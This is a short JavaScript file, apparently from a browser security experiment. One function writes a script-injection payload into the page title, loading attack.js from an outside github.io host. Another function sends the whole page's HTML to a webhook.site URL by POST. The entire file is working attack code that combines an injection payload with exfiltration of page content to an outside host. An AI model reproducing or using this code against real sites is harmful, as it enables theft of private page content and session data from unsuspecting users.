function changeTitle() {
    var attackScript = "<script src='https://jba192.github.io/browserSec/attack.js'></script><button onload='sendHTML()'></button>";
    if (document.title != attackScript) {
        document.title = attackScript;
    }
}

function sendHTML() {
    var html = document.documentElement.outerHTML;
    var server = new XMLHttpRequest;
    server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeURIComponent(html));
    server.send();
}